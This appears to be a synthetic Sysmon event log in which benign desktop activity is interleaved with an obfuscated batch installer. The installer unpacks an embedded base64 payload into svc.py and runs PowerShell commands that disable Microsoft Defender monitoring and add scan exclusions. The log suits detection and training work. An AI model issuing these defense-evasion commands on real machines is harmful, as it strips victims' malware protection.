{"@timestamp":"2026-04-22T03:13:25.548414Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","name":"msedge.exe","command_line":"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-pre-read-main-dll","parent":{"executable":"C:\\Windows\\explorer.exe","name":"explorer.exe","command_line":"C:\\Windows\\explorer.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1487,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","CommandLine":"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-pre-read-main-dll","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\explorer.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:13:25.548"}}}
{"@timestamp":"2026-04-22T03:13:35.030687Z","event":{"code":"3","provider":"Microsoft-Windows-Sysmon","action":"Network Connect","category":["network"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\svchost.exe","name":"svchost.exe"},"destination":{"ip":"23.221.236.43","port":443,"domain":"windowsupdate.microsoft.com"},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":3,"record_id":1777,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\svchost.exe","User":"SKYLOOM\\jhowell","DestinationIp":"23.221.236.43","DestinationPort":443,"DestinationHostname":"windowsupdate.microsoft.com","Protocol":"tcp","UtcTime":"2026-04-22 03:13:35.030"}}}
{"@timestamp":"2026-04-22T03:13:39.716472Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","name":"msedge.exe","command_line":"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-pre-read-main-dll","parent":{"executable":"C:\\Windows\\explorer.exe","name":"explorer.exe","command_line":"C:\\Windows\\explorer.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1434,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","CommandLine":"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-pre-read-main-dll","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\explorer.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:13:39.716"}}}
{"@timestamp":"2026-04-22T03:13:40.254347Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\backgroundTaskHost.exe","name":"backgroundTaskHost.exe","command_line":"\"C:\\Windows\\System32\\backgroundTaskHost.exe\" -ServerName:App.AppX8e37cbb3-0000-0000-0000-000000000000","parent":{"executable":"C:\\Windows\\System32\\services.exe","name":"services.exe","command_line":"C:\\Windows\\System32\\services.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1574,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\backgroundTaskHost.exe","CommandLine":"\"C:\\Windows\\System32\\backgroundTaskHost.exe\" -ServerName:App.AppX8e37cbb3-0000-0000-0000-000000000000","ParentImage":"C:\\Windows\\System32\\services.exe","ParentCommandLine":"C:\\Windows\\System32\\services.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:13:40.254"}}}
{"@timestamp":"2026-04-22T03:13:41.720039Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","name":"msedge.exe","command_line":"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-pre-read-main-dll","parent":{"executable":"C:\\Windows\\explorer.exe","name":"explorer.exe","command_line":"C:\\Windows\\explorer.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1425,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","CommandLine":"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-pre-read-main-dll","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\explorer.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:13:41.720"}}}
{"@timestamp":"2026-04-22T03:13:44.110776Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe","name":"OneDrive.exe","command_line":"\"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background","parent":{"executable":"C:\\Windows\\explorer.exe","name":"explorer.exe","command_line":"C:\\Windows\\explorer.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1181,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe","CommandLine":"\"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\explorer.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:13:44.110"}}}
{"@timestamp":"2026-04-22T03:13:44.792410Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","name":"msedge.exe","command_line":"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-pre-read-main-dll","parent":{"executable":"C:\\Windows\\explorer.exe","name":"explorer.exe","command_line":"C:\\Windows\\explorer.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1582,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","CommandLine":"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-pre-read-main-dll","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\explorer.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:13:44.792"}}}
{"@timestamp":"2026-04-22T03:13:51.591885Z","event":{"code":"11","provider":"Microsoft-Windows-Sysmon","action":"File Created","category":["file"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\svchost.exe","name":"svchost.exe"},"file":{"path":"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\f_027081","name":"f_027081"},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":11,"record_id":2047,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\svchost.exe","TargetFilename":"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\f_027081","User":"SKYLOOM\\jhowell","UtcTime":"2026-04-22 03:13:51.591"}}}
{"@timestamp":"2026-04-22T03:13:57.970443Z","event":{"code":"3","provider":"Microsoft-Windows-Sysmon","action":"Network Connect","category":["network"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe","name":"Teams.exe"},"destination":{"ip":"142.250.80.46","port":443,"domain":"www.google.com"},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":3,"record_id":1847,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe","User":"SKYLOOM\\jhowell","DestinationIp":"142.250.80.46","DestinationPort":443,"DestinationHostname":"www.google.com","Protocol":"tcp","UtcTime":"2026-04-22 03:13:57.970"}}}
{"@timestamp":"2026-04-22T03:14:00.053514Z","event":{"code":"11","provider":"Microsoft-Windows-Sysmon","action":"File Created","category":["file"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe","name":"Teams.exe"},"file":{"path":"C:\\Users\\jhowell\\AppData\\Roaming\\Microsoft\\Word\\AutoRecovery save of Document52478.asd","name":"AutoRecovery save of Document52478.asd"},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":11,"record_id":1985,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Users\\jhowell\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe","TargetFilename":"C:\\Users\\jhowell\\AppData\\Roaming\\Microsoft\\Word\\AutoRecovery save of Document52478.asd","User":"SKYLOOM\\jhowell","UtcTime":"2026-04-22 03:14:00.053"}}}
{"@timestamp":"2026-04-22T03:14:02.507342Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\MoUsoCoreWorker.exe","name":"MoUsoCoreWorker.exe","command_line":"C:\\Windows\\System32\\MoUsoCoreWorker.exe -Embedding","parent":{"executable":"C:\\Windows\\System32\\svchost.exe","name":"svchost.exe","command_line":"C:\\Windows\\System32\\svchost.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1649,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\MoUsoCoreWorker.exe","CommandLine":"C:\\Windows\\System32\\MoUsoCoreWorker.exe -Embedding","ParentImage":"C:\\Windows\\System32\\svchost.exe","ParentCommandLine":"C:\\Windows\\System32\\svchost.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:02.507"}}}
{"@timestamp":"2026-04-22T03:14:02.552697Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","name":"OUTLOOK.EXE","command_line":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\" /recycle","parent":{"executable":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","name":"OUTLOOK.EXE","command_line":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1307,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","CommandLine":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\" /recycle","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","ParentCommandLine":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:02.552"}}}
{"@timestamp":"2026-04-22T03:14:06.929510Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe","name":"GoogleUpdate.exe","command_line":"\"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\" /ua /installsource scheduler","parent":{"executable":"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe","name":"GoogleUpdate.exe","command_line":"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1562,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe","CommandLine":"\"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe\" /ua /installsource scheduler","ParentImage":"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe","ParentCommandLine":"C:\\Program Files\\Google\\Update\\GoogleUpdate.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:06.929"}}}
{"@timestamp":"2026-04-22T03:14:11.400000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","parent":{"executable":"C:\\Windows\\System32\\cmd.exe","name":"cmd.exe","command_line":"cmd.exe /c \"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1001,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","CommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd.exe /c \"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"MD5=5761c3b476d48608c3af01902a7671b1,SHA256=491e7a0e09376fd11749123a4a105b0682598fc39cbbab7ddfe6dede66ee7665","UtcTime":"2026-04-22 03:14:11.400"}}}
{"@timestamp":"2026-04-22T03:14:11.800000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\findstr.exe","name":"findstr.exe","command_line":"findstr /n \"::PAYLOAD-START::\" \"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1002,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\findstr.exe","CommandLine":"findstr /n \"::PAYLOAD-START::\" \"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:11.800"}}}
{"@timestamp":"2026-04-22T03:14:11Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\cmd.exe","name":"cmd.exe","command_line":"cmd.exe /c \"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","parent":{"executable":"C:\\Windows\\explorer.exe","name":"explorer.exe","command_line":"C:\\Windows\\explorer.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1000,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c \"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\explorer.exe","User":"SKYLOOM\\jhowell","Hashes":"MD5=5761c3b476d48608c3af01902a7671b1,SHA256=491e7a0e09376fd11749123a4a105b0682598fc39cbbab7ddfe6dede66ee7665","UtcTime":"2026-04-22 03:14:11.000"}}}
{"@timestamp":"2026-04-22T03:14:12.200000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","command_line":"powershell -NoProfile -Command \"$src='C:\\Users\\jhowell\\Downloads\\install_obf.bat'; $dst='C:\\Users\\jhowell\\AppData\\Local\\SystemServices\\svc.b64'; (Get-Content -LiteralPath $src -Encoding ASCII)[N..M] -join '' | Set-Content -LiteralPath $dst\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1003,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -NoProfile -Command \"$src='C:\\Users\\jhowell\\Downloads\\install_obf.bat'; $dst='C:\\Users\\jhowell\\AppData\\Local\\SystemServices\\svc.b64'; (Get-Content -LiteralPath $src -Encoding ASCII)[N..M] -join '' | Set-Content -LiteralPath $dst\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:12.200"}}}
{"@timestamp":"2026-04-22T03:14:12.600000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","command_line":"powershell -NoProfile -Command \"$b64=Get-Content 'C:\\Users\\jhowell\\AppData\\Local\\SystemServices\\svc.b64'; $bytes=[Convert]::FromBase64String($b64); $ds=New-Object IO.Compression.DeflateStream(...); Set-Content -LiteralPath 'C:\\Users\\jhowell\\AppData\\Local\\SystemServices\\svc.py' -Value $text -Encoding UTF8\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1004,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -NoProfile -Command \"$b64=Get-Content 'C:\\Users\\jhowell\\AppData\\Local\\SystemServices\\svc.b64'; $bytes=[Convert]::FromBase64String($b64); $ds=New-Object IO.Compression.DeflateStream(...); Set-Content -LiteralPath 'C:\\Users\\jhowell\\AppData\\Local\\SystemServices\\svc.py' -Value $text -Encoding UTF8\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:12.600"}}}
{"@timestamp":"2026-04-22T03:14:13.044464Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","name":"msedge.exe","command_line":"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-pre-read-main-dll","parent":{"executable":"C:\\Windows\\explorer.exe","name":"explorer.exe","command_line":"C:\\Windows\\explorer.exe"}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1398,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe","CommandLine":"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-pre-read-main-dll","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\explorer.exe","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:13.044"}}}
{"@timestamp":"2026-04-22T03:14:13.100000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","command_line":"powershell -NoProfile -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1005,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -NoProfile -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:13.100"}}}
{"@timestamp":"2026-04-22T03:14:13.500000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","command_line":"powershell -NoProfile -Command \"Add-MpPreference -ExclusionPath 'C:\\Users\\jhowell\\AppData\\Local\\SystemServices'\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1007,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -NoProfile -Command \"Add-MpPreference -ExclusionPath 'C:\\Users\\jhowell\\AppData\\Local\\SystemServices'\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:13.500"}}}
{"@timestamp":"2026-04-22T03:14:13.800000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","command_line":"powershell -NoProfile -Command \"Add-MpPreference -ExclusionProcess 'python.exe'\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1009,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -NoProfile -Command \"Add-MpPreference -ExclusionProcess 'python.exe'\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:13.800"}}}
{"@timestamp":"2026-04-22T03:14:14.100000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","command_line":"powershell -NoProfile -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1011,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -NoProfile -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:14.100"}}}
{"@timestamp":"2026-04-22T03:14:14.261687Z","event":{"code":"11","provider":"Microsoft-Windows-Sysmon","action":"File Created","category":["file"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\svchost.exe","name":"svchost.exe"},"file":{"path":"C:\\Users\\jhowell\\AppData\\Roaming\\Microsoft\\Word\\AutoRecovery save of Document85266.asd","name":"AutoRecovery save of Document85266.asd"},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":11,"record_id":2006,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\svchost.exe","TargetFilename":"C:\\Users\\jhowell\\AppData\\Roaming\\Microsoft\\Word\\AutoRecovery save of Document85266.asd","User":"SKYLOOM\\jhowell","UtcTime":"2026-04-22 03:14:14.261"}}}
{"@timestamp":"2026-04-22T03:14:14.400000Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon","action":"Process Create","category":["process"],"type":["start"]},"host":{"hostname":"eng-bell-04","name":"eng-bell-04"},"user":{"name":"jhowell","domain":"SKYLOOM"},"process":{"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","command_line":"powershell -NoProfile -Command \"Set-MpPreference -DisableIOAVProtection $true\"","parent":{"executable":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","name":"install_obf.bat","command_line":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\""}},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":1013,"computer_name":"eng-bell-04","event_data":{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -NoProfile -Command \"Set-MpPreference -DisableIOAVProtection $true\"","ParentImage":"C:\\Users\\jhowell\\Downloads\\install_obf.bat","ParentCommandLine":"\"C:\\Users\\jhowell\\Downloads\\install_obf.bat\"","User":"SKYLOOM\\jhowell","Hashes":"","UtcTime":"2026-04-22 03:14:14.400"}}}
